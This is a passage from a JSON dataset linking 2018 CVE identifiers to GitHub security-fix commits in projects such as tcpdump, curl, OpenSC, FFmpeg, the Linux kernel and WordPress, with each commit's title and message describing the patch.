    "body": "Need to test bounds check for the last field of the structure lsa6_hdr.No need to test other fields.Include Security working under the Mozilla SOS program had independentlyidentified this vulnerability in 2018 by means of code audit.Wang Junjie of 360 ESG Codesafe Team had independently identified thisvulnerability in 2018 by means of fuzzing and provided the packet capturefile for the test.",
    "cveIds": [
      "CVE-2018-14880"
    ],
    "cveIdsCount": 1
  },
  "b16523541da0e68eca5397f69c5bf2f07e955bf7e3e1d4b39f84f65e2ac2dcc0": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/86326e880d31b328a151d45348c35220baa9a1ff",
    "title": "(for 4.9.3) CVE-2018-14881/BGP: Fix BGP_CAPCODE_RESTART.",
    "body": "Add a bounds check and a comment to bgp_capabilities_print().This fixes a buffer over-read discovered by Bhargava Shastry,SecT/TU Berlin.Add a test using the capture file supplied by the reporter(s).",
    "cveIds": [
      "CVE-2018-14881"
    ],
    "cveIdsCount": 1
  },
  "f42cf87771737a316703462015bde24b3b98ce5fe2823454c51992dee78161e7": {
    "url": "https://github.com/the-tcpdump-group/tcpdump/commit/d7505276842e85bfd067fa21cdb32b8a2dc3c5e4",
    "title": "(for 4.9.3) CVE-2018-14882/ICMP6 RPL: Add a missing bounds check",
    "body": "Moreover:Add and use *_tstr[] strings.Update four tests outputs accordingly.Fix a space.Wang Junjie of 360 ESG Codesafe Team had independently identified thisvulnerability in 2018 by means of fuzzing and provided the packet capturefile for the test.",
    "cveIds": [
      "CVE-2018-14882"
    ],
    "cveIdsCount": 1
  },
  "d0ae8c36ffde4f5d316dbf923fc2ea0c701a915d554989332e7f7213e00a9a6a": {
    "url": "https://github.com/GNOME/pango/commit/71aaeaf020340412b8d012fe23a556c0420eda5f",
    "title": "Prevent an assertion with invalid Unicode sequences",
    "body": "Invalid Unicode sequences, such as 0x2665 0xfe0e 0xfe0f,can trick the Emoji iter code into returning an emptysegment, which then triggers an assertion in the itemizer.Prevent this by ensuring that we make progress.This issue was reported by Jeffrey M.",
    "cveIds": [
      "CVE-2018-15120"
    ],
    "cveIdsCount": 1
  },
  "c2696e932befaebcdc204a6ebe6e3cefca92b92383571d108a117e42925db2e5": {
    "url": "https://github.com/ImageMagick/ImageMagick/commit/216d117f05bff87b9dc4db55a1b1fadb38bcb786",
    "title": "XBM coder leaves the hex image data uninitialized if hex value of the…",
    "body": "… pixel is negative",
    "cveIds": [
      "CVE-2018-16323"
    ],
    "cveIdsCount": 1
  },
  "ea8f32a3ff08d5fd13c24acacd062f812b68c7a72a552d3b3f70c23fc1c68913": {
    "url": "https://github.com/OpenSC/OpenSC/releases/tag/0.19.0-rc1",
    "title": "",
    "body": "prepare 0.19.0",
    "cveIds": [
      "CVE-2018-16391",
      "CVE-2018-16392",
      "CVE-2018-16393",
      "CVE-2018-16418",
      "CVE-2018-16419",
      "CVE-2018-16420",
      "CVE-2018-16421",
      "CVE-2018-16422",
      "CVE-2018-16427"
    ],
    "cveIdsCount": 9
  },
  "0eb382c4e4474a3f6d953346ddadc27216872f3a75c1366928577b8c8330cc8d": {
    "url": "https://github.com/OpenSC/OpenSC/commit/360e95d45ac4123255a4c796db96337f332160ad#diff-477b7a40136bb418b10ce271c8664536",
    "title": "fixed out of bounds writes",
    "body": "Thanks to Eric Sesterhenn from X41 D-SEC GmbHfor reporting the problems.",
    "cveIds": [
      "CVE-2018-16391"
    ],
    "cveIdsCount": 1
  },
  "4839bd4d6c899172e00ac8822ca0e2e664a9a96a445bcf394081e27b4840984c": {
    "url": "https://github.com/OpenSC/OpenSC/commit/360e95d45ac4123255a4c796db96337f332160ad#diff-b2a356323a9ff2024d041cf2d7e89dd3",
    "title": "fixed out of bounds writes",
    "body": "Thanks to Eric Sesterhenn from X41 D-SEC GmbHfor reporting the problems.",
    "cveIds": [
      "CVE-2018-16392"
    ],
    "cveIdsCount": 1
  },
  "3c113463cc9a5d0c11f4de0aca131ca75b329dbb6042f03f64d03dc240e0b49b": {
    "url": "https://github.com/OpenSC/OpenSC/commit/360e95d45ac4123255a4c796db96337f332160ad",
    "title": "fixed out of bounds writes",
    "body": "Thanks to Eric Sesterhenn from X41 D-SEC GmbHfor reporting the problems.",
    "cveIds": [
      "CVE-2018-16393"
    ],
    "cveIdsCount": 1
  },
  "725d5766928ea4af20affe52ac90d84a0cc7db67bb205b97ec1f8bf3fc619c5e": {
    "url": "https://github.com/OpenSC/OpenSC/commit/360e95d45ac4123255a4c796db96337f332160ad#diff-628c8445c4e7ae92bbc4be08ba11a4c3",
    "title": "fixed out of bounds writes",
    "body": "Thanks to Eric Sesterhenn from X41 D-SEC GmbHfor reporting the problems.",
    "cveIds": [
      "CVE-2018-16418"
    ],
    "cveIdsCount": 1
  },
  "f4a93a543095415722e16fddac1cdbd43ce390a0f6e3b83262f6b60661e2200c": {
    "url": "https://github.com/OpenSC/OpenSC/commit/360e95d45ac4123255a4c796db96337f332160ad#diff-a6074523a9cbd875e26c58e20868fb15",
    "title": "fixed out of bounds writes",
    "body": "Thanks to Eric Sesterhenn from X41 D-SEC GmbHfor reporting the problems.",
    "cveIds": [
      "CVE-2018-16419"
    ],
    "cveIdsCount": 1
  },
  "3990e0331261861bd895be4a6342b87b0ddeeaa903f21ed4dee2c9be4a80749e": {
    "url": "https://github.com/OpenSC/OpenSC/commit/360e95d45ac4123255a4c796db96337f332160ad#diff-b36536074d13447fbbec061e0e64d15d",
    "title": "fixed out of bounds writes",
    "body": "Thanks to Eric Sesterhenn from X41 D-SEC GmbHfor reporting the problems.",
    "cveIds": [
      "CVE-2018-16420"
    ],
    "cveIdsCount": 1
  },
  "501d91e48d9f87aa927e7d70d812a86bee36efd5e458b637c76cf54541da367b": {
    "url": "https://github.com/OpenSC/OpenSC/commit/360e95d45ac4123255a4c796db96337f332160ad#diff-848b13147a344ba2c6361d91ca77feb1",
    "title": "fixed out of bounds writes",
    "body": "Thanks to Eric Sesterhenn from X41 D-SEC GmbHfor reporting the problems.",
    "cveIds": [
      "CVE-2018-16421"
    ],
    "cveIdsCount": 1
  },
  "8051ba5386352d4bed6c33fc8339f1a04d0cbc069b89f8eb8eaa55dc1ec60f76": {
    "url": "https://github.com/OpenSC/OpenSC/commit/360e95d45ac4123255a4c796db96337f332160ad#diff-d64c08c80437cf0006ada91e50f20ba0",
    "title": "fixed out of bounds writes",
    "body": "Thanks to Eric Sesterhenn from X41 D-SEC GmbHfor reporting the problems.",
    "cveIds": [
      "CVE-2018-16422"
    ],
    "cveIdsCount": 1
  },
  "02754fe38eafff68e1ab7c59e652a4dd7175f758a3525267385fc9d7b4aec8fe": {
    "url": "https://github.com/OpenSC/OpenSC/pull/1447/commits/8fe377e93b4b56060e5bbfb6f3142ceaeca744fa",
    "title": "fixed out of bounds reads",
    "body": "Thanks to Eric Sesterhenn from X41 D-SEC GmbHfor reporting and suggesting security fixes.",
    "cveIds": [
      "CVE-2018-16427"
    ],
    "cveIdsCount": 1
  },
  "b52f06504875a24d1199275ce0a5484cd521b5ddac6bcf976a91a8c43bfce3aa": {
    "url": "https://github.com/mm2/Little-CMS/commit/768f70ca405cd3159d990e962d54456773bb8cf8",
    "title": "Upgrade Visual studio 2017 15.8",
    "body": "- Upgrade to 15.8- Add check on CGATS memory allocation (thanks to Quang Nguyen forpointing out this)",
    "cveIds": [
      "CVE-2018-16435"
    ],
    "cveIdsCount": 1
  },
  "1879c98521cec68a9a9e89988ed8e8d1259178cce76dd21ab76c3f596d0b5a09": {
    "url": "https://github.com/torvalds/linux/commit/8f3fafc9c2f0ece10832c25f7ffcb07c97a32ad4",
    "title": "cdrom: Fix info leak/OOB read in cdrom_ioctl_drive_status",
    "body": "Like d88b6d0: \"cdrom: information leak in cdrom_ioctl_media_changed()\"There is another cast from unsigned long to int which causesa bounds check to fail with specially crafted input. The value isthen used as an index in the slot array in cdrom_slot_status().Signed-off-by: Scott Bauer <scott.bauer@intel.com>Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>Cc: stable@vger.kernel.orgSigned-off-by: Jens Axboe <axboe@kernel.dk>",
    "cveIds": [
      "CVE-2018-16658"
    ],
    "cveIdsCount": 1
  },
  "ef493e760d17632d7c3532945221449f56c92e887acb7617c493ce4c61b842db": {
    "url": "https://github.com/mongodb/mongo-c-driver/commit/0d9a4d98bfdf4acd2c0138d4aaeb4e2e0934bd84",
    "title": "Fix for CVE-2018-16790 -- Verify bounds before binary length read.",
    "body": "As reported here: https://jira.mongodb.org/browse/CDRIVER-2819,a heap overread occurs due a failure to correctly verify databounds.In the original check, len - o returns the data left including thesizeof(l) we just read. Instead, the comparison should checkagainst the data left NOT including the binary int32, i.e. justsubtype (byte*) instead of int32 subtype (byte*).Added in test for corrupted BSON example.",
    "cveIds": [
      "CVE-2018-16790"
    ],
    "cveIdsCount": 1
  },
  "5da0e5f5930065a0e80f5f2e01615bafa380fa2bda62640c5ef86324d7da2d69": {
    "url": "https://github.com/curl/curl/commit/f3a24d7916b9173c69a3e0ee790102993833d6c5",
    "title": "Curl_auth_create_plain_message: fix too-large-input-check",
    "body": "CVE-2018-16839Reported-by: Harry SintonenBug: https://curl.haxx.se/docs/CVE-2018-16839.html",
    "cveIds": [
      "CVE-2018-16839"
    ],
    "cveIdsCount": 1
  },
  "897231fc499e2f932e772ad8f136ccb05a1277e633f3631e8ed2649262e94800": {
    "url": "https://github.com/curl/curl/commit/81d135d67155c5295b1033679c606165d4e28f3f",
    "title": "Curl_close: clear data->multi_easy on free to avoid use-after-free",
    "body": "Regression from b46cfbc (7.59.0)CVE-2018-16840Reported-by: Brian Carpenter (Geeknik Labs)Bug: https://curl.haxx.se/docs/CVE-2018-16840.html",
    "cveIds": [
      "CVE-2018-16840"
    ],
    "cveIdsCount": 1
  },
  "fd686e2e7246d796c774c38e2b830d54f4882aa36d0279833deccfee03eb2c11": {
    "url": "https://github.com/curl/curl/commit/d530e92f59ae9bb2d47066c3c460b25d2ffeb211",
    "title": "voutf: fix bad arethmetic when outputting warnings to stderr",
    "body": "CVE-2018-16842Reported-by: Brian CarpenterBug: https://curl.haxx.se/docs/CVE-2018-16842.html",
    "cveIds": [
      "CVE-2018-16842"
    ],
    "cveIdsCount": 1
  },
  "0b1f0c46824139e355bfbef9f6a59dc59e73586ce74908226710ceb097ea0687": {
    "url": "https://github.com/golang/net/commit/aaf60122140d3fcf75376d319f0554393160eb50",
    "title": "html: remove special procedure for <template> in frameset im",
    "body": "See more details: https://bugs.chromium.org/p/chromium/issues/detail?id=829668Updates golang/go#23071Change-Id: Ib9c963269f814c3f21d3784754729df57dcc8f90Reviewed-on: https://go-review.googlesource.com/123776Run-TryBot: Kunpei Sakai <namusyaka@gmail.com>TryBot-Result: Gobot Gobot <gobot@golang.org>Reviewed-by: Nigel Tao <nigeltao@golang.org>",
    "cveIds": [
      "CVE-2018-17075"
    ],
    "cveIdsCount": 1
  },
  "f932d1a6bf4ba4d0a0e9493ad9efc1cfcbf1eb3e5ccc11144b66d0a73d84bd49": {
    "url": "https://github.com/php/php-src/commit/23b057742e3cf199612fa8050ae86cae675e214e",
    "title": "Fix for bug #76582",
    "body": "The brigade seems to end up in a messed up state if something failsin shutdown, so we clean it up.",
    "cveIds": [
      "CVE-2018-17082"
    ],
    "cveIdsCount": 1
  },
  "6c3a077a5520be958f9bea309e46f9537295b2216fcacca6c4f9e5ec16dec99b": {
    "url": "https://github.com/microweber/microweber/commit/982ea9d5efb7d2306a05644ebc3469dadb33767e",
    "title": "fix of issue #484",
    "body": "editing user now requires csrf token",
    "cveIds": [
      "CVE-2018-17104"
    ],
    "cveIdsCount": 1
  },
  "c22c4c9651b4db3502ef35edc2516b3b6b46c5103996ac733c46997bf959d567": {
    "url": "https://github.com/torvalds/linux/commit/7a9cdebdcc17e426fb5287e4a82db1dfe86339b2",
    "title": "mm: get rid of vmacache_flush_all() entirely",
    "body": "Jann Horn points out that the vmacache_flush_all() function is not onlypotentially expensive, it's buggy too. It also happens to be entirelyunnecessary, because the sequence number overflow case can be avoided bysimply making the sequence number be 64-bit. That doesn't even grow thedata structures in question, because the other adjacent fields arealready 64-bit.So simplify the whole thing by just making the sequence number overflowcase go away entirely, which gets rid of all the complications and makesthe code faster too. Win-win.[ Oleg Nesterov points out that the VMACACHE_FULL_FLUSHES statistics also just goes away entirely with this ]Reported-by: Jann Horn <jannh@google.com>Suggested-by: Will Deacon <will.deacon@arm.com>Acked-by: Davidlohr Bueso <dave@stgolabs.net>Cc: Oleg Nesterov <oleg@redhat.com>Cc: stable@kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2018-17182"
    ],
    "cveIdsCount": 1
  },
  "f4cf174c1b27dfc089559879de582dc3aae6a16e7eda6d0bb86ab695e6abbc85": {
    "url": "https://github.com/openvswitch/ovs/commit/9237a63c47bd314b807cda0bd2216264e82edbe8",
    "title": "ofp-actions: Avoid buffer overread in BUNDLE action decoding.",
    "body": "Reported-at: https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=9052Signed-off-by: Ben Pfaff <blp@ovn.org>Acked-by: Justin Pettit <jpettit@ovn.org>",
    "cveIds": [
      "CVE-2018-17206"
    ],
    "cveIdsCount": 1
  },
  "337235fe46785edcacc0f63b3551c516c06039b9e58b19213636ca18d4dbc68e": {
    "url": "https://github.com/WAVM/WAVM/commit/2de6cf70c5ef31e22ed119a25ac2daeefd3d18a1",
    "title": "Fix out-of-bounds array access when passing a <4 byte input file to w…",
    "body": "…avm or wavm-compile",
    "cveIds": [
      "CVE-2018-17292"
    ],
    "cveIdsCount": 1
  },
  "35a4932b83bc7d6c8c34590e0ca5da3097733d7a45f818512723ca0bf547b9c8": {
    "url": "https://github.com/WAVM/WAVM/commit/31d670b6489e6d708c3b04b911cdf14ac43d846d",
    "title": "Fix dereferencing null pointer when running wavm with WebAssembly mai…",
    "body": "…n function that takes command-line arguments but no Emscripten memory to write them to",
    "cveIds": [
      "CVE-2018-17293"
    ],
    "cveIdsCount": 1
  },
  "9adabb54903ab3154dbba6a2907a80a950c951aafea7de27f5e1e8db8bc3ec51": {
    "url": "https://github.com/liblouis/liblouis/commit/5e4089659bb49b3095fa541fa6387b4c40d7396e",
    "title": "Fix a buffer overflow",
    "body": "Fixes #635Thanks to HongxuChen for reporting it",
    "cveIds": [
      "CVE-2018-17294"
    ],
    "cveIdsCount": 1
  },
  "1a55fa9316febe102ce158d836abbfa9d0e5e5130e00bc648213561b32fc2978": {
    "url": "https://github.com/TeX-Live/texlive-source/commit/6ed0077520e2b0da1fd060c7f88db7b2e6068e4c",
    "title": "writet1 protection against buffer overflow",
    "body": "git-svn-id: svn://tug.org/texlive/trunk/Build/source@48697 c570f23f-e606-0410-a88d-b1316a301751",
    "cveIds": [
      "CVE-2018-17407"
    ],
    "cveIdsCount": 1
  },
  "4d08729f86b604e68b332dc09cedf83e5e70b1ab5c5b564ba4f363763b67be45": {
    "url": "https://github.com/NavigateCMS/Navigate-CMS/commit/6df73ccca64253a5e81c23356943fae50ffc836f",
    "title": "* security fix: replace string filtering by parameterization in almos…",
    "body": "…t all queries",
    "cveIds": [
      "CVE-2018-17552"
    ],
    "cveIdsCount": 1
  },
  "c16a809142826c2477c416a3854d3840efef93ffd6d9f2dd0175e6339089cea5": {
    "url": "https://github.com/viabtc/viabtc_exchange_server/commit/4a7c27bfe98f409623d4d857894d017ff0672cc9#diff-0c23effa84a7b85053bac7981a8580c8",
    "title": "Merge pull request #131 from benjaminchodroff/master",
    "body": "fix memory corruption and other 32bit overflows",
    "cveIds": [
      "CVE-2018-17568"
    ],
    "cveIdsCount": 1
  },
  "3c59aff7c54aaaf5b1bd8a0dce8049658e8da55467b23a88d1de8f54b41dce42": {
    "url": "https://github.com/viabtc/viabtc_exchange_server/commit/4a7c27bfe98f409623d4d857894d017ff0672cc9#diff-9fabc53ea796ec492aef432594298baa",
    "title": "Merge pull request #131 from benjaminchodroff/master",
    "body": "fix memory corruption and other 32bit overflows",
    "cveIds": [
      "CVE-2018-17569"
    ],
    "cveIdsCount": 1
  },
  "f843758cb33ca6c5d47628df733bf93e8bc25bb252ac3124ef361efe2e57a95e": {
    "url": "https://github.com/viabtc/viabtc_exchange_server/commit/4a7c27bfe98f409623d4d857894d017ff0672cc9#diff-515c81af848352583bff286d6224875f",
    "title": "Merge pull request #131 from benjaminchodroff/master",
    "body": "fix memory corruption and other 32bit overflows",
    "cveIds": [
      "CVE-2018-17570"
    ],
    "cveIdsCount": 1
  },
  "53ea9708dc7223f58ba169e1e055fed503eba7338e7773fa1a784e9406cc55a0": {
    "url": "https://github.com/influxdata/influxdb/releases/tag/v0.9.6",
    "title": "",
    "body": "If the engine is closed while a compaction is going on, the close callblocks until the goroutine exits. This could be several minutes becausethe control does not return back up to the channel selector while there isstill data to write.",
    "cveIds": [
      "CVE-2018-17572"
    ],
    "cveIdsCount": 1
  },
  "71a9782bb2b87a1aca04382824801f86bd40b00923672305b2e30ea61a5b434d": {
    "url": "https://github.com/bertramdev/asset-pipeline/commit/a29533c52e4b60e244082433e116d2a038d01017",
    "title": "fixing jetty classloader vulnerability with potential reverse file tr…",
    "body": "…averse route when running servlet based apps in jetty",
    "cveIds": [
      "CVE-2018-17605"
    ],
    "cveIdsCount": 1
  },
  "9743e9ad4073eaf0ed6e00bbe2bb176085e269fdffb4527548bbed0579732389": {
    "url": "https://github.com/coreutils/gnulib/commit/278b4175c9d7dd47c1a3071554aac02add3b3c35",
    "title": "vasnprintf: Fix heap memory overrun bug.",
    "body": "Reported by Ben Pfaff <blp@cs.stanford.edu> in<https://lists.gnu.org/archive/html/bug-gnulib/2018-09/msg00107.html>.* lib/vasnprintf.c (convert_to_decimal): Allocate one more byte ofmemory.* tests/test-vasnprintf.c (test_function): Add another test.",
    "cveIds": [
      "CVE-2018-17942"
    ],
    "cveIdsCount": 1
  },
  "1aaa21caedea36009ca5861a2e24060381c692966f89fc9376189d84df3b75c2": {
    "url": "https://github.com/torvalds/linux/commit/d26c25a9d19b5976b319af528886f89cf455692d",
    "title": "arm64: KVM: Tighten guest core register access from userspace",
    "body": "We currently allow userspace to access the core register filein about any possible way, including straddling multipleregisters and doing unaligned accesses.This is not the expected use of the ABI, and nobody is actuallyusing it that way. Let's tighten it by explicitly checkingthe size and alignment for each field of the register file.Cc: <stable@vger.kernel.org>Fixes: 2f4a07c (\"arm64: KVM: guest one-reg interface\")Reviewed-by: Christoffer Dall <christoffer.dall@arm.com>Reviewed-by: Mark Rutland <mark.rutland@arm.com>Signed-off-by: Dave Martin <Dave.Martin@arm.com>[maz: rewrote Dave's initial patch to be more easily backported]Signed-off-by: Marc Zyngier <marc.zyngier@arm.com>Signed-off-by: Will Deacon <will.deacon@arm.com>",
    "cveIds": [
      "CVE-2018-18021"
    ],
    "cveIdsCount": 1
  },
  "0645fb98100bbd44c9f116129b26308d5c9e33c0aa02600330d2a2ca469232c9": {
    "url": "https://github.com/torvalds/linux/commit/2a3f93459d689d990b3ecfbe782fec89b97d3279",
    "title": "arm64: KVM: Sanitize PSTATE.M when being set from userspace",
    "body": "Not all execution modes are valid for a guest, and some of themdepend on what the HW actually supports. Let's verify that whatuserspace provides is compatible with both the VM settings andthe HW capabilities.Cc: <stable@vger.kernel.org>Fixes: 0d854a6 (\"arm64: KVM: enable initialization of a 32bit vcpu\")Reviewed-by: Christoffer Dall <christoffer.dall@arm.com>Reviewed-by: Mark Rutland <mark.rutland@arm.com>Reviewed-by: Dave Martin <Dave.Martin@arm.com>Signed-off-by: Marc Zyngier <marc.zyngier@arm.com>Signed-off-by: Will Deacon <will.deacon@arm.com>",
    "cveIds": [
      "CVE-2018-18021"
    ],
    "cveIdsCount": 1
  },
  "ac24c423bf1dbaa2217c1fae0d6c1da1748f5a3541b572c6e857b1693993d720": {
    "url": "https://github.com/Bytom/bytom/commit/1ac3c8ac4f2b1e1df9675228290bda6b9586ba42",
    "title": "p2p/discv5: fix idx can be negative after uint convert to int(can cau…",
    "body": "…se crash) (#1307)",
    "cveIds": [
      "CVE-2018-18206"
    ],
    "cveIdsCount": 1
  },
  "a70d719e2a043f92d85e90648cb9961cb36fed5331a4c024037393f3163b07ad": {
    "url": "https://github.com/MailCleaner/MailCleaner/commit/5f90a52785672fc688c1f85e472e84b8a0d008d8",
    "title": "Bug fix - Issue #53",
    "body": "Bug fix of a XSS issue on MailCleaner login (administration) interface. See issue #53 The \"message\" parameter was only used for the logoutAction(). However, the parameter was not checked and not escaped.",
    "cveIds": [
      "CVE-2018-18635"
    ],
    "cveIdsCount": 1
  },
  "13d28036a4bfb4f29d97f7317ad274b1a65e0ee65b446d1a51a0ff9e371c55c7": {
    "url": "https://github.com/gnuboard/gnuboard5/releases/tag/5.3.2.0",
    "title": "",
    "body": "Merge branch 'master' of github.com:gnuboard/g5",
    "cveIds": [
      "CVE-2018-18668",
      "CVE-2018-18669",
      "CVE-2018-18670",
      "CVE-2018-18671",
      "CVE-2018-18672",
      "CVE-2018-18673",
      "CVE-2018-18674",
      "CVE-2018-18675",
      "CVE-2018-18676",
      "CVE-2018-18678"
    ],
    "cveIdsCount": 10
  },
  "93e3c26633e497072e2e32cbe6cfc5a3acfc12c54f82df2efccc36f48943ed5e": {
    "url": "https://github.com/torvalds/linux/commit/e4f3aa2e1e67bb48dfbaaf1cad59013d5a5bc276",
    "title": "cdrom: fix improper type cast, which can leat to information leak.",
    "body": "There is another cast from unsigned long to int which causesa bounds check to fail with specially crafted input. The value isthen used as an index in the slot array in cdrom_slot_status().This issue is similar to CVE-2018-16658 and CVE-2018-10940.Signed-off-by: Young_X <YangX92@hotmail.com>Signed-off-by: Jens Axboe <axboe@kernel.dk>",
    "cveIds": [
      "CVE-2018-18710"
    ],
    "cveIdsCount": 1
  },
  "4af4c29fba9a771812fa6e8441c9fdfa23accbc729ca0b07bdf268061f954042": {
    "url": "https://github.com/torvalds/linux/commit/5f8cf712582617d523120df67d392059eaf2fc4b",
    "title": "ALSA: usb-audio: Fix UAF decrement if card has no live interfaces in …",
    "body": "…card.cIf a USB sound card reports 0 interfaces, an error condition is triggeredand the function usb_audio_probe errors out. In the error path, there was ause-after-free vulnerability where the memory object of the card was firstfreed, followed by a decrement of the number of active chips. Moving thedecrement above the atomic_dec fixes the UAF.[ The original problem was introduced in 3.1 kernel, while it was developed in a different form. The Fixes tag below indicates the original commit but it doesn't mean that the patch is applicable cleanly. -- tiwai ]Fixes: 362e4e4 (\"ALSA: usb-audio - clear chip->probing on error exit\")Reported-by: Hui Peng <benquike@gmail.com>Reported-by: Mathias Payer <mathias.payer@nebelwelt.net>Signed-off-by: Hui Peng <benquike@gmail.com>Signed-off-by: Mathias Payer <mathias.payer@nebelwelt.net>Cc: <stable@vger.kernel.org>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2018-19824"
    ],
    "cveIdsCount": 1
  },
  "6d9f8f809b4cfa8975a0cae0b917d60edd941f17942daf0cec5b18c252523899": {
    "url": "https://github.com/torvalds/linux/commit/f43f39958beb206b53292801e216d9b8a660f087",
    "title": "crypto: user - fix leaking uninitialized memory to userspace",
    "body": "All bytes of the NETLINK_CRYPTO report structures must be initialized,since they are copied to userspace. The change from strncpy() tostrlcpy() broke this. As a minimal fix, change it back.Fixes: 4473710 (\"crypto: user - Prepare for CRYPTO_MAX_ALG_NAME expansion\")Cc: <stable@vger.kernel.org> # v4.12+Signed-off-by: Eric Biggers <ebiggers@google.com>Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>",
    "cveIds": [
      "CVE-2018-19854"
    ],
    "cveIdsCount": 1
  },
  "bae8c615f665bf43402fcbc84278983392b3f4cdbc90bda96d0bd9f5b223b448": {
    "url": "https://github.com/MISP/MISP/commit/211ac0737281b65e7da160f0aac52f401a94e1a3",
    "title": "fix: [internal] Handle the upload of original versions of ingested fi…",
    "body": "…les via a helper function instead of leaving it to external tools",
    "cveIds": [
      "CVE-2018-19908"
    ],
    "cveIdsCount": 1
  },
  "497203f7d356b8cc5fe3643e9c9b91ee8fdf01073891388097f86e7797ed65a6": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/cced03dd667a5df6df8fd40d8de0bff477ee02e8",
    "title": "avformat/mms: Add missing chunksize check",
    "body": "Fixes: out of array readFixes: mms-crash-01b6c5d85f9d9f40f4e879896103e9f5b222816aFound-by: Paul Ch <paulcher@icloud.com>1st hunk by Paul Ch <paulcher@icloud.com>Tested-by: Paul Ch <paulcher@icloud.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-1999010"
    ],
    "cveIdsCount": 1
  },
  "9a378465246deca26f0d4ac3272eaded7ee4b2fc3ee984f161e58de96a881e6e": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/2b46ebdbff1d8dec7a3d8ea280a612b91a582869",
    "title": "avformat/asfdec_o: Check size_bmp more fully",
    "body": "Fixes: integer overflow and out of array accessFixes: asfo-crash-46080c4341572a7137a162331af77f6ded45cbd7Found-by: Paul Ch <paulcher@icloud.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-1999011"
    ],
    "cveIdsCount": 1
  },
  "bd08bf6702abc4f7a4c302f3f3d0666921dd675d519f7ce8e57e56c4652d6f29": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/a7e032a277452366771951e29fd0bf2bd5c029f0",
    "title": "avformat/rmdec: Do not pass mime type in rm_read_multi() to ff_rm_rea…",
    "body": "…d_mdpr_codecdata()Fixes: use after free()Fixes: rmdec-crash-ffe85b4cab1597d1cfea6955705e53f1f5c8a362Found-by: Paul Ch <paulcher@icloud.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-1999013"
    ],
    "cveIdsCount": 1
  },
  "d9025335ae14c12a7da4dd49399606075606c6abcd34f35c83f749d345eceab9": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/bab0716c7f4793ec42e05a5aa7e80d82a0dd4e75",
    "title": "avformat/mxfdec: Fix av_log context",
    "body": "Fixes: out of array accessFixes: mxf-crash-1c2e59bf07a34675bfb3ada5e1ec22fa9f38f923Found-by: Paul Ch <paulcher@icloud.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-1999014"
    ],
    "cveIdsCount": 1
  },
  "9254c2ed58c9646ed4cfe86ea2e773c088fe321cdf7b7f29f9d275da33ff8863": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/5aba5b89d0b1d73164d3b81764828bb8b20ff32a",
    "title": "avcodec/mpeg4videodec: Check for bitstream end in read_quant_matrix_e…",
    "body": "…xt()Fixes: out of array readFixes: asff-crash-0e53d0dc491dfdd507530b66562812fbd4c36678Found-by: Paul Ch <paulcher@icloud.com>Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2018-1999015"
    ],
    "cveIdsCount": 1
  },
  "db32885934008fa001917d6e125724eb8f8c943bc071adb1f75b104606b3d8f2": {
    "url": "https://github.com/chamilo/chamilo-lms/commit/0de84700648f098c1fbf6b807dee28ec640efe62",
    "title": "Security fix #2532",
    "body": "- Use json_decode/json_encode instead base64- Add Security::remove_XSSS",
    "cveIds": [
      "CVE-2018-1999019"
    ],
    "cveIdsCount": 1
  },
  "f4bd6fe22db28e5201a1904f0b89f2b90cf3ea72f440b6b958f46b324903f845": {
    "url": "https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a",
    "title": "Media: Improve verification of MIME file types.",
    "body": "Built from https://develop.svn.wordpress.org/branches/5.0@43988git-svn-id: http://core.svn.wordpress.org/branches/5.0@43820 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2018-20149"
    ],
    "cveIdsCount": 1
  },
  "d7210fae36b45bfde2412732f6f11f163a40a494262cd45dbb8a0bb1e3586215": {
    "url": "https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460",
    "title": "KSES: Make the URI attributes DRY.",
    "body": "This commit introduces the `wp_kses_uri_attributes` function and filter. The function centralizes the list of attributes, in order to prevent inconsistency, and the filter provides a way for plugins to customize the attributes.Built from https://develop.svn.wordpress.org/branches/5.0@44014git-svn-id: http://core.svn.wordpress.org/branches/5.0@43844 1a063a9b-81f0-0310-95a4-ce76da25c4cd",
    "cveIds": [
      "CVE-2018-20150"
    ],
    "cveIdsCount": 1
  },
  "7cf84d2b22dc1f979291d204012ef53a971ec51afa1b7423db16c5cc3a932b75": {
    "url": "https://github.com/rdesktop/rdesktop/commit/4dca546d04321a610c1835010b5dad85163b65e1",
    "title": "Malicious RDP server security fixes",
    "body": "This commit includes fixes for a set of 21 vulnerabilities inrdesktop when a malicious RDP server is used.All vulnerabilities was identified and reported by Eyal Itkin. * Add rdp_protocol_error function that is used in several fixes * Refactor of process_bitmap_updates * Fix possible integer overflow in s_check_rem() on 32bit arch * Fix memory corruption in process_bitmap_data - CVE-2018-8794 * Fix remote code execution in process_bitmap_data - CVE-2018-8795 * Fix remote code execution in process_plane - CVE-2018-8797 * Fix Denial of Service in mcs_recv_connect_response - CVE-2018-20175 * Fix Denial of Service in mcs_parse_domain_params - CVE-2018-20175 * Fix Denial of Service in sec_parse_crypt_info - CVE-2018-20176 * Fix Denial of Service in sec_recv - CVE-2018-20176 * Fix minor information leak in rdpdr_process - CVE-2018-8791 * Fix Denial of Service in cssp_read_tsrequest - CVE-2018-8792 * Fix remote code execution in cssp_read_tsrequest - CVE-2018-8793 * Fix Denial of Service in process_bitmap_data - CVE-2018-8796 * Fix minor information leak in rdpsnd_process_ping - CVE-2018-8798 * Fix Denial of Service in process_secondary_order - 